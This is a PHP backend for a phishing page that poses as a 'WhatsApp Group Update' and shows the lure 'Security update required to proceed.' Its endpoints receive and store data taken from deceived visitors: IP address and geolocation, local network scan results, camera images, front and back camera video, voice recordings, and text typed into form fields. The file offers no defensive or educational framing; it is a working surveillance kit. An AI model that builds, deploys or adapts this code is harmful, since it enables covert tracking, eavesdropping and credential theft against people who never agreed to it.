<?php
header('Content-Type: application/json; charset=utf-8');

define('LOG_FILE', __DIR__ . '/slid_data/result.jsonl');
define('SAVE_PATH_IMAGE', __DIR__ . '/slid_data/images/');
define('SAVE_PATH_VOICE', __DIR__ . '/slid_data/voice/');
define('SAVE_PATH_VIDEO_FRONT', __DIR__ . '/slid_data/video_front/');
define('SAVE_PATH_VIDEO_BACK', __DIR__ . '/slid_data/video_back/');

$CONFIG = [
    'MODE' => 'normal',
    'SPAM_MESSAGE' => 'Security update required to proceed.',
    'GROUP_NAME' => "WhatsApp Group Update",
    'GROUP_IMAGE' => null,
    'GROUP_MEMBERS' => 125,
];

function send_response(string $message, string $status, int $http_code = 200, ?array $extra_data = null): void {
    http_response_code($http_code);
    $response = ['status' => $status, 'message' => $message];
    if ($extra_data) {
        $response = array_merge($response, $extra_data);
    }
    echo json_encode($response);
    exit;
}

function safe_log_data(array $data): void {
    $log_dir = dirname(LOG_FILE);
    
    if (!is_dir($log_dir)) {
        if (!mkdir($log_dir, 0777, true)) {
            error_log("Failed to create log directory: " . $log_dir);
            return;
        }
    }
    
    $data['log_timestamp'] = date('Y-m-d H:i:s');
    $log_entry = json_encode($data) . "\n";
    
    if (!file_put_contents(LOG_FILE, $log_entry, FILE_APPEND | LOCK_EX)) {
        error_log("Failed to write to log file: " . LOG_FILE);
    }
}

function get_sanitized_http_data(): array {
    $ip = $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
    $ip = filter_var($ip, FILTER_VALIDATE_IP) ?: 'INVALID';
    
    return [
        'ip' => $ip, 
        'user_agent' => filter_var($_SERVER['HTTP_USER_AGENT'] ?? 'UNKNOWN', FILTER_SANITIZE_STRING),
        'method' => $_SERVER['REQUEST_METHOD'],
    ];
}

function save_file_data(string $data_content, string $base_path, string $extension, string $prefix): string {
    if (!is_dir($base_path)) {
        if (!mkdir($base_path, 0777, true)) {
            send_response("Failed to create directory: " . $base_path, 'error', 500);
        }
    }
    
    $filename = sprintf("%s_%d.%s", $prefix, time(), $extension);
    $file_path = $base_path . $filename;
    
    if (!file_put_contents($file_path, $data_content)) {
        error_log("Failed to save file: " . $file_path);
        send_response("Failed to save data file.", 'error', 500);
    }
    
    return $filename;
}

$request_method = $_SERVER['REQUEST_METHOD'];
$request_uri = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
$request_uri = rtrim($request_uri, '/'); 
if ($request_uri === '') { $request_uri = '/'; }

if ($request_method === 'GET' && $request_uri === '/') {
    header('Content-Type: text/html; charset=utf-8');
    
    $html_file = 'index.html';
    if (file_exists($html_file)) {
        include $html_file;
    } else {
        http_response_code(404);
        echo "Error: index.html not found. Ensure it's in the same directory.";
    }
    exit;
}

if ($request_method === 'GET' && $request_uri === '/get_config') {
    global $CONFIG;
    send_response('Config sent.', 'success', 200, $CONFIG);
}

if ($request_method === 'POST' && $request_uri === '/log_data') {
    
    $json_data = file_get_contents('php://input');
    $post_data = json_decode($json_data, true);
    
    if ($post_data === null) {
        send_response('Invalid JSON format received.', 'error', 400);
    }
    
    if (!isset($post_data['latitude']) || !isset($post_data['longitude'])) {
        send_response('Missing required geolocation data.', 'error', 400);
    }

    $log_entry = get_sanitized_http_data();
    $log_entry['type'] = 'geolocation';
    $log_entry['geolocation'] = [
        'latitude' => filter_var($post_data['latitude'], FILTER_SANITIZE_NUMBER_FLOAT, FILTER_FLAG_ALLOW_FRACTION),
        'longitude' => filter_var($post_data['longitude'], FILTER_SANITIZE_NUMBER_FLOAT, FILTER_FLAG_ALLOW_FRACTION),
    ];
    $log_entry['device_data'] = $post_data;

    safe_log_data($log_entry);
    
    send_response('Geolocation Data logged successfully.', 'success', 200);
}

if ($request_method === 'POST' && $request_uri === '/log_network_scan') {
    $json_data = file_get_contents('php://input');
    $post_data = json_decode($json_data, true);

    if ($post_data === null) {
        send_response('Invalid JSON format received.', 'error', 400);
    }
    
    $log_entry = get_sanitized_http_data();
    $log_entry['type'] = 'network_scan';
    $log_entry['scan_results'] = $post_data;

    safe_log_data($log_entry);
    
    send_response('Network Scan data logged successfully.', 'success', 200);
}

if ($request_method === 'POST' && $request_uri === '/capture_image') {
    $json_data = file_get_contents('php://input');
    $post_data = json_decode($json_data, true);
    
    if (!isset($post_data['image_data'])) {
        send_response('Missing image data.', 'error', 400);
    }

    $base64_string = preg_replace('/^data:image\/\w+;base64,/', '', $post_data['image_data']);
    $image_content = base64_decode($base64_string);

    if ($image_content === false) {
        send_response('Invalid base64 encoding.', 'error', 400);
    }

    $filename = save_file_data($image_content, SAVE_PATH_IMAGE, 'jpg', 'image');
    
    send_response('Image saved successfully.', 'success', 200, ['filename' => $filename]);
}

if ($request_method === 'POST' && $request_uri === '/capture_video' && isset($_FILES['video_data'])) {
    
    $video_file = $_FILES['video_data'];
    $file_content = file_get_contents($video_file['tmp_name']);
    
    $original_name = $video_file['name'];
    $camera_type = strpos($original_name, 'front') !== false ? 'front' : (strpos($original_name, 'back') !== false ? 'back' : 'unknown');
    
    $base_path = ($camera_type === 'front') ? SAVE_PATH_VIDEO_FRONT : SAVE_PATH_VIDEO_BACK;
    $prefix = "video_{$camera_type}";

    $filename = save_file_data($file_content, $base_path, 'webm', $prefix);
    
    send_response('Video saved successfully.', 'success', 200, ['filename' => $filename]);
}

if ($request_method === 'POST' && $request_uri === '/record_voice' && isset($_FILES['audio_data'])) {
    
    $audio_file = $_FILES['audio_data'];
    $file_content = file_get_contents($audio_file['tmp_name']);

    $filename = save_file_data($file_content, SAVE_PATH_VOICE, 'ogg', 'voice');
    
    send_response('Voice recording saved successfully.', 'success', 200, ['filename' => $filename]);
}

if ($request_method === 'POST' && $request_uri === '/log_input') {
    $json_data = file_get_contents('php://input');
    $post_data = json_decode($json_data, true);

    if ($post_data === null || !isset($post_data['input_data'])) {
        send_response('Missing input data.', 'error', 400);
    }
    
    $log_entry = get_sanitized_http_data();
    $log_entry['type'] = 'user_input';
    $log_entry['input_data'] = filter_var($post_data['input_data'], FILTER_SANITIZE_STRING);
    $log_entry['field_id'] = filter_var($post_data['field_id'] ?? 'unknown', FILTER_SANITIZE_STRING);

    safe_log_data($log_entry);
    
    send_response('User input logged successfully.', 'success', 200);
}

send_response('Endpoint Not Found.', 'error', 404);

?>
